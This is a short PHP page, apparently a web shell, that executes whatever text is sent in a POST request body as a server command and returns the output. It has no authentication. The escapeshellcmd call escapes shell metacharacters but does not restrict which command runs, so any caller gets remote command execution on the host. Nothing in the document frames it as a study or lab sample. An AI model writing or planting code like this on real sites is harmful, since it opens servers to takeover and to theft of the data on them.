<html>
   <head>
      <title>Chuchah</title>
   </head>
   <body>
      <?php
          if($_SERVER["REQUEST_METHOD"]=="POST") {
              exec(escapeshellcmd(file_get_contents('php://input')), $output, $code);
              echo json_encode($output);
          } else {
              echo "what are you doing man only POST method is allowed";
          }
      ?>
   </body>
</html>
